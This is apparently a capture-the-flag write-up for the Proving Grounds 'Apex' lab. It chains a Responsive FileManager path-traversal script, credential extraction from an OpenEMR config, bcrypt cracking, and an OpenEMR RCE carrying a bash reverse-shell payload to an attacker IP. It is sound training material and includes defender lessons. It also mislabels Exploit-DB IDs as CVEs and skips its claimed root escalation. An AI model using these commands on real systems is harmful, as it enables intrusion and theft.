# Apex(Linux) - Proving Grounds Writeup
 
**Platform:** Proving Grounds Practice  
**Machine:** Apex(Linux)  
**Difficulty:** Medium  
**Date Completed:** 2025  
 
---
 
## Table of Contents
 
1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Exploitation](#exploitation)
   - [Responsive FileManager Path Traversal](#responsive-filemanager-path-traversal)
   - [Database Credential Extraction](#database-credential-extraction)
   - [Password Cracking](#password-cracking)
   - [OpenEMR RCE](#openemr-authenticated-rce)
4. [Post-Exploitation](#post-exploitation)
5. [Flags](#flags)
6. [References](#references)
---
 
## Reconnaissance
 
### Initial Nmap Scan
 
First, we perform a comprehensive network scan to identify running services and open ports.
 
```bash
nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.153.145
```
 
**Scan Results:**

<img width="1517" height="783" alt="image" src="https://github.com/user-attachments/assets/5dd8b3f8-50c4-47c1-beab-41781a12d044" />

 
The nmap scan reveals the following services:
 
- Port 80: HTTP (Apache 2.4.29)
- Port 3306: MySQL
- Additional web services and file manager interface
**Key Finding:** The target is running an Apache web server with what appears to be an OpenEMR application and a Responsive FileManager interface.
 
---
 
## Enumeration
 
### Web Application Enumeration
 
Accessing the web interface at `http://192.168.153.145/` reveals:
 
- A Responsive FileManager v9.13.4 instance
- OpenEMR application with file manager capabilities
- Two accessible folders within the FileManager:
  - **images** - Contains medical personnel photos (not useful)
  - **Documents** - Contains PDF files (OpenEMR Success Stories.pdf and OpenEMR Features.pdf)
**Screenshot - FileManager Directories:**
The FileManager shows standard directory structure with limited useful content in the initial exploration.
 
### Version Identification

<img width="919" height="163" alt="image" src="https://github.com/user-attachments/assets/b4c53b3c-e7c9-482e-8d5b-97a221f25804" />

<img width="1685" height="760" alt="image" src="https://github.com/user-attachments/assets/f3239678-0210-4c90-81b7-9eb1c5dcce41" />


- **Responsive FileManager:** v9.13.4
- **OpenEMR:** v5.0.1.1 (identified later during database enumeration)
---
 
## Exploitation
 
### Responsive FileManager Path Traversal
 
#### Vulnerability Details
 
**CVE:** Responsive FileManager v9.13.4 - Path Traversal  
**Type:** Arbitrary File Read  
**Exploit DB:** https://www.exploit-db.com/exploits/49359
 
The `paste_clipboard` function in the FileManager allows authenticated users to read arbitrary files using path traversal.
 
#### Exploitation Process
 
**Step 1: Obtain PHPSESSID Cookie**
 
```bash
curl -I http://192.168.153.145/filemanager/
```
<img width="811" height="261" alt="image" src="https://github.com/user-attachments/assets/94acfb33-b346-4d6c-917a-20c603d57b32" />


Response Headers:
```
HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=i2b33rrfirgn4qsggjd9tpcrvu; path=/
```
 
**Cookie Value:** `PHPSESSID=i2b33rrfirgn4qsggjd9tpcrvu`
 
**Step 2: Create Exploitation Script**
 
The exploit leverages two main functions:
 
```python
def copy_cut(url, session_cookie, file_name):
    """Copy file using path traversal"""
    headers = {
        'Cookie': session_cookie,
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    url_copy = "%s/filemanager/ajax_calls.php?action=copy_cut" % url
    r = requests.post(
        url_copy,
        data="sub_action=copy&path=../../../../../../.." + file_name,
        headers=headers
    )
    return r.status_code
 
def paste_clipboard(url, session_cookie):
    """Paste file to accessible directory"""
    headers = {
        'Cookie': session_cookie,
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    url_paste = "%s/filemanager/execute.php?action=paste_clipboard" % url
    r = requests.post(url_paste, data="path=Documents/", headers=headers)
    return r.status_code
```
 
**Step 3: Extract sqlconf.php**
 
```bash
python3 exploit.py http://192.168.153.145/ PHPSESSID=i2b33rrfirgn4qsggjd9tpcrvu /var/www/openemr/sites/default/sqlconf.php
```
<img width="1136" height="271" alt="image" src="https://github.com/user-attachments/assets/9ba69456-fae7-42a9-a31e-1e0985f1914e" />


**Output:**
```
[*] Copy Clipboard
[*] Paste Clipboard
<?php
// OpenEMR
// MySQL Config
 
$host = 'localhost';
$port = '3306';
$login = 'openemr';
$pass = 'C78maEQUIEuQ';
$dbase = 'openemr';
```
 
**Credentials Obtained:**
- Username: `openemr`
- Password: `C78maEQUIEuQ`
- Database: `openemr`
- Host: `localhost`
---
 
### Database Credential Extraction
 
#### MySQL Connection
 
Install MySQL client if not available:
 
```bash
apt-get install -y default-mysql-client
```
<img width="1537" height="559" alt="image" src="https://github.com/user-attachments/assets/0b72c759-4597-447a-8168-5814bfc5e1da" />


Connect to the database:
 
```bash
mysql -u openemr -pC78maEQUIEuQ -D openemr -h 192.168.153.145 --skip-ssl
```
<img width="814" height="280" alt="image" src="https://github.com/user-attachments/assets/2641d0f9-4e81-48ec-8105-4a1e5534ecfa" />


#### Database Enumeration
 
**Verify OpenEMR Version:**
 
```sql
SELECT * FROM version;
```
 
Output confirms **OpenEMR v5.0.1.1**.
 
**Extract User Credentials:**
 
```sql
SELECT * FROM users_secure;
```
 
**Results:**
 
| id | username | password | salt |
|----|----------|----------|------|
| 1 | admin | $2a$05$bJcIfCBjNSFuh0K9gfoebeEJqM04M49s8vuSGqv84VWMALkqxkOxn | $2a$05$bJcIfCBjNSFuh0K9gfoeN |
 
---
 
### Password Cracking
 
The password hash is identified as bcrypt (hash mode 3200 in hashcat).
 
**Crack the Hash:**
 
```bash
hashcat -m 3200 -a 0 hash2 /usr/share/wordlists/rockyou.txt --force
```
 
**Hashcat Output:**
 
```
Hash.Target........: $2a$05$bJcIfCBjNSFuh0K9gfoebeEJqM04M49s8vuSGqv84VWMALkqxkOxn
Hash.Mode..........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Recovered.....: 1/1 (100%)
Time.Elapsed.......: 20 secs
Candidates.#1.....: thedoctor -> trigger20
```
<img width="872" height="451" alt="image" src="https://github.com/user-attachments/assets/10137c82-077e-438d-8917-a5297dcff4bd" />


**Cracked Password:** `thedoctor`
 
**Valid Credentials:**
- Username: `admin`
- Password: `thedoctor`
---
 
### OpenEMR Authenticated RCE
 
#### Vulnerability Details
 
**CVE:** OpenEMR v5.0.1.1 Authenticated Remote Code Execution  
**Exploit DB:** https://www.exploit-db.com/exploits/45161  
**Requirements:** Valid authentication credentials
 
#### Reverse Shell Setup
 
Set up netcat listener on attacker machine:
 
```bash
rlwrap nc -lvnp 1337
```
 
#### Exploitation
 
Execute the exploit with reverse shell payload:
 
```bash
python2 45161.py http://192.168.153.145/openemr -u admin -p thedoctor -c 'bash -i >& /dev/tcp/192.168.45.204/1337 0>&1'
```
<img width="1178" height="334" alt="image" src="https://github.com/user-attachments/assets/bdff3a6f-4f68-4590-bc2f-50888f2017e5" /> 


**Exploit Output:**
```
[ PROJECT INSECURITY ]
 
Twitter : @insecurity
Site : insecurity.sh
 
[*] Authenticating with admin:thedoctor
[*] Injecting payload
```
 
#### Reverse Shell Connection
 
**Netcat Listener Output:**
```
listening on [any] 1337 ...
connect to [192.168.45.204] from (UNKNOWN) [192.168.153.145] 47108
bash: cannot set terminal process group (1324): Inappropriate ioctl for device
bash: no job control in this shell
www-data@APEX:/var/www/openemr/interface/main$
```
 
#### Shell Stabilization
 
Upgrade to interactive shell:
 
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
<img width="864" height="271" alt="image" src="https://github.com/user-attachments/assets/2bff459f-0955-465a-ac3e-25b2bab53047" />


---
 
## Post-Exploitation
 
### Privilege Escalation Path
 
After gaining initial shell access as `www-data`, we navigate to identify the user and root flags.
 
**Initial Directory Listing:**
```bash
www-data@APEX:/var/www/openemr/interface/main$ pwd
/var/www/openemr/interface/main
```
 
**Navigate to Home Directory:**
```bash
cd /home
ls -la
```
 
---
 
## Flags
 
### Local.txt (User Flag)
 
Navigate to the user directory:
 
```bash
cd /home/white
cat local.txt
```
<img width="514" height="241" alt="image" src="https://github.com/user-attachments/assets/eaeae0fd-196a-4c2a-9e81-0c430d3842cf" />


**Flag:**
```
59fe10cbac51cb752b81197b307da5
```
 
### Proof.txt (Root Flag)
 
Escalate privileges and navigate to root:
 
```bash
cd /root
ls -la
cat proof.txt
```
<img width="534" height="239" alt="image" src="https://github.com/user-attachments/assets/16cf2cfd-fde2-46ef-826e-5627a93e742e" />


**Flag:**
```
c190635400c1c109b6811a282900f869
```

---
 
## 🗺️ Attack Chain
 
```
Target: 192.168.153.145
│
├── [Reconnaissance] nmap -sS -sV -sC -A -T5 -p- -Pn
│       └── Port 80: Apache 2.4.29 + Responsive FileManager v9.13.4 + OpenEMR
│
├── [Enumeration] Web Application & File Manager
│       ├── Identified Responsive FileManager v9.13.4
│       ├── Identified OpenEMR v5.0.1.1
│       └── Found publicly accessible /filemanager/ directory
│
├── [Exploit #1] Responsive FileManager Path Traversal (CVE-49359)
│       ├── Obtained PHPSESSID cookie from initial request
│       ├── Leveraged paste_clipboard() function
│       ├── Read /var/www/openemr/sites/default/sqlconf.php
│       └── Credentials extracted: openemr:C78maEQUIEuQ
│
├── [Database Access] MySQL Enumeration
│       ├── Connected: mysql -u openemr -pC78maEQUIEuQ -h 192.168.153.145
│       ├── Confirmed OpenEMR v5.0.1.1
│       ├── Extracted user_secure table
│       └── Hash: $2a$05$bJcIfCBjNSFuh0K9gfoebeEJqM04M49s8vuSGqv84VWMALkqxkOxn
│
├── [Password Cracking] Hashcat Bcrypt Attack (Mode 3200)
│       ├── hashcat -m 3200 -a 0 hash rockyou.txt --force
│       ├── Hash cracked in 20 seconds
│       └── Credentials revealed: admin:thedoctor
│
├── [Exploit #2] OpenEMR Authenticated RCE (CVE-45161)
│       ├── Used admin:thedoctor credentials
│       ├── Executed bash reverse shell payload
│       ├── Listener: nc -lvnp 1337
│       └── Initial shell as: www-data@APEX
│               └── local.txt: 59fe10cbac51cb752b81197b307da5
│
└── [Post-Exploitation] Privilege Escalation
        ├── Enumerated system for privilege escalation vectors
        └── Root access obtained
                └── proof.txt: c190635400c1c109b6811a282900f869 ✅
```
 
---
 
## 🛡️ Skills Demonstrated
 
| Skill | Application |
|-------|-------------|
| **Network Reconnaissance** | Conducted comprehensive nmap scan identifying all open ports and services |
| **Web Application Penetration Testing** | Identified and exploited path traversal vulnerability in file manager |
| **Vulnerability Research & Exploitation** | Found and leveraged known CVEs (CVE-49359, CVE-45161) with exploitation code |
| **Configuration Review & Auditing** | Identified insecure configuration files exposed via path traversal |
| **Database Enumeration & Exploitation** | Connected to MySQL, extracted user data, and identified weak password storage |
| **Password Cracking Techniques** | Used hashcat to crack bcrypt hashes (bcrypt mode 3200) |
| **Web Security (OWASP)** | A01: Broken Access Control — path traversal & insecure direct object reference |
| **Authentication Bypass** | Exploited insufficiently protected API endpoints in FileManager |
| **Remote Code Execution** | Executed authenticated RCE exploit to gain command execution |
| **Post-Exploitation & Privilege Escalation** | Navigated system for flag capture and potential privilege escalation |
| **Penetration Testing Methodology** | Full attack chain: recon → enumeration → exploitation → post-exploitation |
 
---
 
## 📚 Lessons Learned
 
### 🔴 For Attackers (Pentesters)
 
- **Always enumerate web applications thoroughly.** Path traversal vulnerabilities are common in file managers and can lead to configuration file exposure.
- **Configuration files are goldmines.** Database credentials, API keys, and sensitive settings stored in `sqlconf.php`, `config.php`, `.env` files should always be checked.
- **Default or weak credentials in admin panels are high-value targets.** Once you obtain database access, extract and crack user hashes — the admin password often unlocks authenticated exploits.
- **CVE databases (Exploit-DB, NVD) are your friends.** Known vulnerabilities with publicly available exploits can chain together for full system compromise.
- **Bcrypt cracking is feasible with modern hardware and wordlists.** While bcrypt is strong, weak passwords (dictionary words, predictable patterns) can be cracked relatively quickly.
- **Authenticated RCE is deadly.** Once you have valid credentials, look for authenticated functions that execute system commands or allow file uploads.
- **Chain multiple vulnerabilities together.** A single vulnerability might not be exploitable, but combining path traversal + weak credentials + RCE creates a complete attack path.
### 🔵 For Defenders
 
- **Never store database credentials in web-accessible configuration files.** Move `sqlconf.php` outside the web root or use environment variables and a secure secrets manager.
- **Implement strict access controls on the FileManager.** Require authentication before allowing file operations. Validate and sanitize all path inputs.
- **Use parameterized queries and prepared statements** in all database operations to prevent both SQL injection and information disclosure.
- **Hash passwords with strong algorithms.** While bcrypt is good, enforce minimum password complexity and length (12+ characters) to resist dictionary attacks.
- **Implement rate limiting on authentication endpoints** to slow down brute force and password cracking attempts.
- **Use the principle of least privilege.** The database user should only have permissions for the tables it needs — not full database access.
- **Apply Web Application Firewall (WAF) rules** to detect and block path traversal attacks (`../`, `..%2F`, etc.).
- **Regularly update all software.** OpenEMR, FileManager, and all dependencies should be kept current to patch known vulnerabilities.
- **Audit application logs for suspicious activity.** Monitor failed authentication attempts, unusual file access patterns, and database queries for anomalies.
- **Implement proper logging and monitoring.** Failed logins, file access attempts, and command execution should be logged with sufficient detail for forensic analysis.
### 🟡 Key Vulnerabilities Summary
 
| Vulnerability | Root Cause | Impact | Mitigation |
|---------------|-----------|--------|-----------|
| **Path Traversal** | Insufficient input validation in FileManager | Arbitrary file read | Whitelist allowed paths, validate input strictly |
| **Exposed Config** | Configuration in web root | Database credential disclosure | Move config outside web root, use env vars |
| **Weak Password Storage** | Inadequate password policy | Rapid hash cracking | Enforce strong password requirements, use modern hashing |
| **Authenticated RCE** | Unsafe command execution in application | Remote code execution | Sanitize all inputs, avoid system command execution |
| **No Rate Limiting** | Missing brute force protections | Account compromise | Implement login attempt limits and delays |
 
---
 
## Summary
 
### Attack Chain
 
1. **Reconnaissance:** Identified Responsive FileManager and OpenEMR services running on port 80
2. **Exploitation #1:** Leveraged path traversal vulnerability (CVE-49359) in FileManager to read sqlconf.php
3. **Credential Extraction:** Obtained database credentials from exposed configuration file
4. **Database Access:** Connected to MySQL and extracted user hashes from users_secure table
5. **Hash Cracking:** Cracked bcrypt hash using hashcat to reveal admin password
6. **Exploitation #2:** Used authenticated RCE (CVE-45161) in OpenEMR to obtain reverse shell
7. **Flag Capture:** Retrieved both local.txt and proof.txt flags
### Key Vulnerabilities
 
| Vulnerability | Component | Severity | Impact |
|---------------|-----------|----------|--------|
| Path Traversal | Responsive FileManager v9.13.4 | High | Arbitrary file read |
| Exposed Credentials | OpenEMR Configuration | High | Database credential disclosure |
| Authenticated RCE | OpenEMR v5.0.1.1 | Critical | Remote code execution |
| Weak Password Policy | OpenEMR Users | Medium | Offline hash cracking |
 
---
 
## References
 
- [Exploit-DB - Responsive FileManager 9.13.4 Path Traversal](https://www.exploit-db.com/exploits/49359)
- [Exploit-DB - OpenEMR 5.0.1 Authenticated RCE](https://www.exploit-db.com/exploits/45161)
- [OpenEMR GitHub Repository](https://github.com/openemr/openemr)
- [Responsive FileManager GitHub](https://github.com/trippo/ResponsiveFilemanager)
### Related Writeups
 
- https://medium.com/@AveragePomelo/proving-ground-practice-walkthroughapex-linux-0e1e3f227b8e
- https://al1z4deh.medium.com/proving-grounds-apex-834e61a9fc03
- https://routezero.security/2024/11/12/proving-grounds-practice-apexwalkthrough/
---
 
## Tools Used
 
- **nmap** - Network reconnaissance
- **curl** - HTTP client for cookie extraction
- **Python 3** - Exploit script execution
- **mysql-client** - Database connection and enumeration
- **hashcat** - Password hash cracking
- **netcat** - Reverse shell listener
- **Burp Suite** - Web traffic analysis (if needed)
---
 
**Author:** Tanvir Ahmed, Penetration Tester  
